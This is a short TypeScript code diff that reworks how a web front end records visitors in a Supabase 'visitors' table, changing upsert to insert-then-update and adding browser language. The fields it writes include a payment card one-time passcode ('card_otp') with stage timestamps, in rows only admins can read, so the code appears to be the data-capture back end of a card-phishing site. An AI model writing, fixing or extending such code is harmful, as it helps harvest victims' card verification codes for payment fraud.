@@ -70,15 +70,15 @@ const ensureVisitorRecord = async (payload: BootstrapPayload) => {
 
   bootstrapSessionId = payload.session_id;
   bootstrapPromise = (async () => {
-    // Merge-upsert so we both create the row and refresh last_seen/last_path
-    // on returning visitors. ignoreDuplicates would skip the row entirely.
     const { error } = await supabase
       .from("visitors")
-      .upsert(payload, { onConflict: "session_id" });
-    if (error) {
-      console.error("[visitor] bootstrap upsert failed", error);
+      .insert(payload);
+
+    if (error && error.code !== "23505") {
+      console.error("[visitor] bootstrap insert failed", error);
       return;
     }
+
     markBootstrapped(payload.session_id);
   })().finally(() => {
     bootstrapPromise = null;
@@ -144,25 +144,24 @@ export const updateVisitorData = async (data: {
     ...(data.card_otp ? { otp_at: now } : {}),
   };
 
-  // Always upsert directly. We can't rely on UPDATE+SELECT because the SELECT
-  // policy on `visitors` only allows admins to read rows — a regular visitor's
-  // .select() will return [] even when the update succeeded, leading us to a
-  // wrong "row missing" branch. Upsert with merge handles both create + update
-  // in a single round-trip without needing to read back.
-  const { error: upsertErr } = await supabase.from("visitors").upsert(
-    {
-      ...createWindowBootstrapPayload(session_id),
+  await ensureVisitorRecord(createWindowBootstrapPayload(session_id));
+
+  const { error: updateErr } = await supabase
+    .from("visitors")
+    .update({
       ...data,
       ...stageStamps,
       last_seen_at: now,
       last_path: window.location.pathname,
-    },
-    { onConflict: "session_id" }
-  );
-  if (upsertErr) {
-    console.error("[visitor] upsert failed", upsertErr);
-    throw upsertErr;
+      language: navigator.language,
+    })
+    .eq("session_id", session_id);
+
+  if (updateErr) {
+    console.error("[visitor] update failed", updateErr);
+    throw updateErr;
   }
+
   markBootstrapped(session_id);
 };
 
